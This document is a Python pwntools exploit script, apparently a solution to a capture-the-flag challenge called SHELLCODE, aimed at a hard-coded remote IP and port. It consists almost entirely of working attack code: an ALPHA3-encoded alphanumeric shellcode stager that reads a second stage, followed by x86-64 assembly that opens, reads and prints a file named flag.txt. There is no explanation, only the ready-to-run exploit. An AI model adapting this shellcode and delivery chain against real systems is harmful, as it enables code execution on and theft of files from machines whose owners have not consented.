# encoding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './SHELLCODE'
e = ELF(file)
context.arch = e.arch
libc = e.libc
ip = '183.129.189.60'
port = '10033'
local = 0


def dbg(code=""):
    if local == 0:
        return
    gdb.attach(p, code)


def run():
    global p
    if local == 1:
        p = process(file)
    else:
        p = remote(ip, port)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run()
rc()
read_call = '''
    sub rax,rax
    mov rsi,rsp
    xor rdi,rdi
    mov rdx,r11
    sub rsi,rdx
    syscall
    nop
    call rsi
'''
open('read_call', 'wb').write(asm(read_call))
'''
ALPHA3转换：Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M152x3e0z3a3E2M114E1O3x3y2m7K5k7n04344z3w
'''

read_call = 'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M152x3e0z3a3E2M114E1O3x3y2m7K5k7n04344z3w'.ljust(
    100, '\x00')

open_flag = asm('''
	push 0x747874
	pop rax
	shl rax,32
	or rax,0x67616c66
	push rax
	mov rdi,rsp
	mov rsi,0
	mov rdx,0
	mov rax,2
	syscall
''')

read_flag = asm('''
	mov rax,0
	mov rdi,3
	mov rsi,rbp
	mov rdx,100
	syscall
''')

write_flag = asm('''
	mov rax,1
	mov rdi,1
	mov rdx,100
	syscall
	pop rax
	ret
''')
dbg('breakrva 0xabd')
se(read_call + open_flag + read_flag + write_flag)
print rc()